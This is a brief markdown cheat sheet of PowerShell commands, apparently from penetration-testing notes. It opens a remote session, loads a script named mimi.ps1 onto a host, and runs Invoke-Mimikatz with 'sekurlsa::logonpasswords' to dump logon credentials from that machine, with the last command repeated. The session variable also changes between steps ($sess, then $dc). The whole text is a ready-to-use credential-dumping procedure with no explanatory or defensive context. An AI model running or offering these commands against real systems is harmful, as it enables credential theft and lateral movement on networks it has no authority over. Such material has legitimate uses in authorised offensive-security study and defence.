# Powershell

## Commands

### Create a remote session

```text
$sess = New-PSSession -ComputerName lab.test.local
```

### Load a script 

```text
Invoke-Command  -FilePath{C:\temp\mimi.ps1} -Session $dc
```

### Execute the script

```text
 Invoke-Command -ScriptBlock{invoke-mimikatz -command '"sekurlsa::logonpasswords"'} $dc
```

Invoke-Command -ScriptBlock{invoke-mimikatz -command '"sekurlsa::logonpasswords"'} $dc



